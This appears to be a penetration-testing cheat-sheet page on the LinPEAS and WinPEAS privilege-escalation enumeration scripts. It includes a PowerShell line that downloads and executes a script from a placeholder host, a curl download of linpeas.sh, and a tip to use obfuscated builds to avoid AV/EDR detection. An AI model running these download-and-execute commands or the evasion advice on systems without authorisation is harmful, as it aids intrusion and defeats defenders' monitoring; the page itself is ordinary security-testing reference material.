# LinPEAS / WinPEAS

LinPEAS and WinPEAS (from the PEASS-ng project) are the most widely used privilege-escalation enumeration scripts for Linux and Windows respectively. They scan a huge range of local misconfigurations, credentials, and known escalation vectors and color-highlight the findings most likely to lead to a privilege escalation path.

## Common Use Cases

* Comprehensive first-pass enumeration after landing an initial low-privilege shell
* Surfacing SUID/SGID binaries, writable services, weak file permissions, stored credentials, and known CVEs
* Cross-referencing enumeration results against GTFOBins / LOLBAS for exploitation

## Core Syntax

```
# Linux
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt

# Windows (PowerShell)
IEX(New-Object Net.WebClient).DownloadString('http://<host>/winPEAS.ps1')
# or run the compiled binary directly
.\winPEASx64.exe
```

{% hint style="info" %}
Output is long. Prefer piping to a file (`tee`) or redirecting so you can search it afterward with `grep` rather than scrolling a live terminal.
{% endhint %}

{% hint style="warning" %}
Both scripts are extremely well known to defenders and AV/EDR vendors — their strings, behaviors, and even file hashes are commonly signatured. Downloading/executing them on a monitored host is one of the more detectable steps in a privesc chain; consider running only the specific checks you need manually, or use a fresh/obfuscated build.
{% endhint %}

## Related

* Linux Smart Enumeration (LSE) — lighter-weight Linux alternative
* LaZagne — focused credential harvesting rather than general enumeration
